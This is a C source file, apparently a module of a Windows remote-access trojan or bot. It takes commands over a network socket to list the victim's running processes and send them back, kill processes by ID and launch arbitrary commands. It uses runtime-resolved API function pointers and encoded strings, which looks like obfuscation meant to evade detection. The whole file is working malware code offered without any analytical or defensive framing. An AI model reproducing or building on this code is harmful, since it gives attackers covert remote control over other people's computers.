#include "stuff.h"
#include "externals.h"

#ifndef NO_PROCESS

void PROC_List(SOCKET sock)
{
	HANDLE			hProcess;
	PROCESSENTRY32	pe32 = {0};
	char			data[1024];

	if ((hProcess = fCreateToolhelp32Snapshot(TH32CS_SNAPALL, 0)) != INVALID_HANDLE_VALUE) 
	{
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (fProcess32First(hProcess, &pe32)) 
		{
			while (fProcess32Next(hProcess, &pe32)) 
			{
				_snprintf(data, sizeof(data) - 1, "%s\"%d\"%d\"%d", 
					pe32.szExeFile, pe32.th32ProcessID, pe32.cntThreads, pe32.pcPriClassBase);
				NET_Send(sock, PROCESS, data);
			}
		}	
	}

	fCloseHandle(hProcess);

	return;
}

void PROC_Kill(SOCKET sock, DWORD pid, unsigned int exitcode)
{
	HANDLE		hProcess;
		
	hProcess = fOpenProcess(PROCESS_TERMINATE, FALSE, pid);
						
	if (fTerminateProcess(hProcess, exitcode))
	{
#ifdef DEBUG
		printf("Terminated process with pid %d\n", pid);
#endif
		// success
		NET_Send(sock, PROCESSACTION, strings[Decode(s_success)].encoded);
	}
	else
	{
#ifdef DEBUG
		printf("Failed to terminate process with pid %d\n", pid);
#endif
		NET_Send(sock, PROCESSACTION, strings[Decode(s_failed)].encoded);
		// failed
	}

	fCloseHandle(hProcess);
}

void PROC_Run(SOCKET sock, char *command)
{
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;

	memset(&pinfo, 0, sizeof(pinfo));
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.lpTitle = "";
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = STARTF_USESHOWWINDOW;
	sinfo.wShowWindow = SW_SHOW;

	if (fCreateProcess(NULL, command, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE, //| DETACHED_PROCESS, 
		NULL, NULL, &sinfo, &pinfo))
		NET_Send(sock, PROCESSACTION, strings[Decode(s_success)].encoded);
	else
		NET_Send(sock, PROCESSACTION, strings[Decode(s_failed)].encoded);
}

#endif